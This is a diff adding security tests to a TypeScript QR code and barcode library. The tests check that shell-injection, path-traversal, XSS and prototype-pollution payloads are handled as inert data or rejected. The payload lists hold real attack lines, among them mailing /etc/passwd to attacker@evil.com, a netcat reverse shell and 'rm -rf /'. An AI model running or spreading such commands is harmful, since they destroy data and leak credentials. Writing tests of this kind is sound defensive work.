@@ -86,4 +86,57 @@ describe('Security & Privacy Guarantees', () => {
       infoSpy.mockRestore();
     }
   });
+
+  it('safely handles shell injection, path traversal, and command payloads as pure data', async () => {
+    const payloads = [
+      '../../../../../../etc/shadow',
+      '$(rm -rf / --no-preserve-root)',
+      'eval(compile("import os; os.system(\'calc.exe\')", "<string>", "exec"))',
+      '; cat /etc/passwd | mail attacker@evil.com ;',
+      '& calc.exe &',
+      '| nc -e /bin/sh 10.0.0.1 4444'
+    ];
+
+    for (const payload of payloads) {
+      // 1. QR Round-trip
+      const qrPng = await generateQrCode(payload, { output: 'png' });
+      const qrDecoded = await readQrCode(qrPng);
+      expect(qrDecoded?.text).toBe(payload);
+
+      // 2. Barcode (Code 128)
+      const barcodeSvg = await generateBarcode(payload, { format: 'CODE_128', output: 'svg' });
+      expect(typeof barcodeSvg).toBe('string');
+      expect(barcodeSvg).toContain('<svg');
+    }
+  });
+
+  it('rejects malicious color injections (XSS/CSS injection)', async () => {
+    const maliciousColors = [
+      'red; background-image: url("https://malicious.site/track")',
+      'javascript:alert(1)',
+      '#ffffff"><script>alert(1)</script>',
+      '" onmouseover="alert(1)"',
+      'expression(alert(1))'
+    ];
+
+    for (const badColor of maliciousColors) {
+      await expect(
+        generateQrCode('test', { foregroundColor: badColor })
+      ).rejects.toThrow(InvalidOptionsError);
+
+      await expect(
+        generateBarcode('test', { format: 'CODE_128', foregroundColor: badColor })
+      ).rejects.toThrow(InvalidOptionsError);
+    }
+  });
+
+  it('resists prototype pollution payloads in options', async () => {
+    const polluter = JSON.parse('{"__proto__": {"polluted": true}}');
+    const qrPng = await generateQrCode('safe data', polluter);
+    expect(qrPng).toBeDefined();
+
+    // Verify global Object prototype was not polluted
+    expect((Object.prototype as Record<string, unknown>)['polluted']).toBeUndefined();
+  });
 });
+
